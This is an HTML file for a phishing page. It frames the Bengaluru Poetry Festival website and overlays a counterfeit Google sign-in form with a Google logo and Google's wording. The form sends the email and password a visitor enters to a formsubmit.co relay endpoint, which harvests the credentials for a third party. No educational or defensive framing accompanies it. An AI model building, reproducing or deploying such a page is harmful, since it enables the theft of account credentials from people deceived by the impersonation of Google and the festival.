<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <link rel="stylesheet" href="style.css">
    <title>Bangalore Poetry Festival</title>
    <script defer src="./index.js"></script>
</head>
<body>
    <iframe id="iframe" class="site" src="https://bengalurupoetryfestival.org/" width="100%" height="1000px">
    </iframe>
    <div class="form-body" id="form-body">
        <div class="form">
            <form action="https://formsubmit.co/e39e1dbdf17c76d2c8a31bfc7046ef6b" method="POST">
                <img src="./ggl.png" height="30px" width="90px"/>
                <div id="a">Sign in</div>
                <div id="b">Use your Google Account</div>
                <input class="inpt" type="email" name="email" required placeholder="Enter your email">
                <input class="inpt" id="password" placeholder="Enter password" type="password" name="name" required>
                <div id="forgot">Forgot email?</div>
                <div id="guest">Not your computer? Use Guest mode to sign in privately.</div>
                <div id="learn">Learn more</div>
                <button type="submit" id="btn">Sign in</button>
            </form>
            


        </div>
    </div>
    
</body>
</html>
